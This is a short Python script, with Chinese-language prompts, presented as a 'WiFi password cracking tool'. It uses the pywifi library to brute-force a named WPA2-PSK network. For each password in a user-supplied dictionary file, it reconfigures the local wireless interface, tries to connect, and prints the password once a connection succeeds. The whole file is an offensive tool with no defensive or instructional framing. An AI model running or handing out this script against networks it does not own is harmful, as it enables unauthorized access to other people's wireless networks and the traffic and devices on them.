import pywifi
from pywifi import const
import time
def wifi_password_crack(wifi_name):
    wifi_dic_path = input("请输入本地用于WiFi暴力破解的密码字典（txt格式，每个密码占据1行）的路径:")
    with open(wifi_dic_path, 'r') as f:
        for pwd in f:
            pwd = pwd.strip('\n')
            wifi = pywifi.PyWiFi()
            interface = wifi.interfaces()[0]
            interface.disconnect()
            while interface.status() == const.IFACE_CONNECTED:
                pass
            profile = pywifi.Profile()
            profile.ssid = wifi_name
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            interface.remove_all_network_profiles()
            tmp_profile = interface.add_network_profile(profile)
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                if interface.status() == const.IFACE_CONNECTED:
                    print(f'\r连接成功！密码为：{pwd}')
                    exit(0)
                else:
                    print(f'\r正在利用密码 {pwd} 尝试破解。', end='')
def main():
    exit_flag = 0
    while not exit_flag:
        try:
            print('WiFi密码破解工具'.center(50, '-'))
            wifi_name = input("请输入要破解的WiFi名称（SSID）：")
            wifi_password_crack(wifi_name)
            print('-' * 50)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e
if __name__ == '__main__':
    main()
